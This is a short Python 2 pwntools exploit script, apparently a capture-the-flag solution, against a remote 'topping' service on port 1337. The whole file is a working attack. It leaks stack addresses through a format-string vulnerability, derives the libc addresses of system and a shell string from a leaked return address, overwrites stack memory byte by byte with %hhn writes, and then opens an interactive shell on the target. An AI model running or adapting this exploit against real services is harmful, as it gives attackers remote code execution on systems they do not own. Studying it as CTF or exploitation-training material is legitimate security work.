#!/usr/bin/env python
import pwn
import sys
import struct

def write8(c, addr, val):
	print "write 0x%x to 0x%x" % (val, addr)
	if val < 16:
		val += 256
	c.send(b"AAAA" + struct.pack("<I", addr) + b"%" + ("%d" % (val - 8)).encode("utf8") + b"c%16$hhn\n1\n")
	c.recvuntil("Current topping:\n")

def write(c, addr, val):
	write8(c, addr, val & 0xff)
	write8(c, addr + 1, (val >> 8) & 0xff)
	write8(c, addr + 2, (val >> 16) & 0xff)
	write8(c, addr + 3, (val >> 24) & 0xff)

c = pwn.remote(sys.argv[1], 1337)
c.send(b"%7$x %82$x\n\n1\n")
c.recvuntil("Current topping:\n")
val = c.recvline().split(' ')
input_buf = int(val[0], 16)
argc_ptr = int(val[1], 16)
print "Input buffer at " + hex(input_buf)
print "argc at " + hex(argc_ptr)
c.send(b"%" + ("%d" % (14 + (argc_ptr - input_buf) / 4)).encode("utf8") + "$x\n1\n")
c.recvuntil("Current topping:\n")
retaddr = int(c.recvline(), 16)
print "return addr is " + hex(retaddr)
system = retaddr + (0x3cd10 - 0x18e81)
sh = retaddr + (0x17b8cf - 0x18e81)
print "system is " + hex(system)
print "sh is " + hex(sh)
write(c, argc_ptr + 4, sh)
write(c, argc_ptr - 4, system)
c.send(b"\n\n")
c.interactive()
